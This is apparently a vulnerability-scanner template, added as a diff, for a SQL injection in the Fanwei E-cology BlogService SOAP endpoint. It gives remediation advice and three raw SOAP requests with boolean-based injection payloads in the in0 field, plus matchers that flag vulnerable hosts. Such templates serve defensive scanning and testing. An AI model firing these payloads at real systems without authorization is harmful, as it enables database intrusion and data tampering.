@@ -1,0 +1,79 @@
+id: Ecology-sqli-BlogService
+info:
+  name: Fanwei E-cology BlogService Injection
+  author:
+  - 折跃
+  description: |-
+    Fanwei E-cology BlogService SQL Injection Vulnerability
+    Fanwei Collaborative Management Application Platform (e-cology) is a large enterprise collaborative management platform that integrates enterprise information portal, knowledge and document management, workflow management, human resource management, customer relationship management, project management, financial management, asset management, supply chain management, and data center capabilities. e-cology can provide a series of general-purpose and industry-specific solutions.
+
+    A SQL injection vulnerability exists in Fanwei E-cology. An attacker can exploit it to execute SQL statements to view, add, modify, or delete information in the database.
+  severity: high
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.weaver.com.cn/
+
+    Temporary remediation:
+    1. Use prepared statements. When using PDO, be careful not to concatenate variables directly into PDO statements. All queries should use the database's parameterized query interface, using parameters instead of embedding user-supplied variables directly into SQL statements. Almost all database systems provide parameterized SQL execution interfaces, which can effectively prevent SQL injection attacks.
+    2. Escape special characters entering the database (such as ', ", <, >, &, *, ;, etc.) or perform encoding conversion.
+    3. Validate the type of each data item; for example, numeric data must be numeric and the corresponding database storage field must be an int type.
+    4. Strictly limit data length, which can, to some extent, prevent longer SQL injection statements from being executed successfully.
+    5. Unify the encoding of every data layer of the website; it is recommended to use UTF-8 encoding throughout, as inconsistent encoding between layers may cause some filtering models to be bypassed.
+    6. Strictly limit the database operational privileges granted to website users, providing only the minimum privileges needed for their work, thereby minimizing the damage injection attacks can cause to the database.
+    7. Avoid displaying SQL error messages on the website, such as type errors and field mismatches, to prevent attackers from leveraging these error messages for reconnaissance.
+    8. Filter dangerous characters; for example, use regular expressions to match keywords such as union, sleep, and, select, and load_file, and terminate execution if a match is found.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - body_1 == body_2
+    - contains(body_3,'<deptName>')
+  raw:
+  - |
+    POST /services/BlogService HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml
+    Soapaction: ""
+
+    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:urn="webservices.blog.weaver.com.cn" xmlns:urn2="http://blog.weaver" xmlns:urn3="http://webservices.blog.weaver">
+    <SOAP-ENV:Header/>
+    <SOAP-ENV:Body>
+      <urn:getMyAttentionList>
+        <urn:in0></urn:in0>
+      </urn:getMyAttentionList>
+    </SOAP-ENV:Body>
+    </SOAP-ENV:Envelope>
+  - |
+    POST /services/BlogService HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml
+    Soapaction: ""
+
+    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:urn="webservices.blog.weaver.com.cn" xmlns:urn2="http://blog.weaver" xmlns:urn3="http://webservices.blog.weaver">
+    <SOAP-ENV:Header/>
+    <SOAP-ENV:Body>
+      <urn:getMyAttentionList>
+        <urn:in0>-1 OR 1=1 AND 1=2</urn:in0>
+      </urn:getMyAttentionList>
+    </SOAP-ENV:Body>
+    </SOAP-ENV:Envelope>
+  - |
+    POST /services/BlogService HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml
+    Soapaction: ""
+
+    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:urn="webservices.blog.weaver.com.cn" xmlns:urn2="http://blog.weaver" xmlns:urn3="http://webservices.blog.weaver">
+    <SOAP-ENV:Header/>
+    <SOAP-ENV:Body>
+      <urn:getMyAttentionList>
+        <urn:in0>-1 OR 1=1 AND 1=1</urn:in0>
+      </urn:getMyAttentionList>
+    </SOAP-ENV:Body>
+    </SOAP-ENV:Envelope>
+  req-condition: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
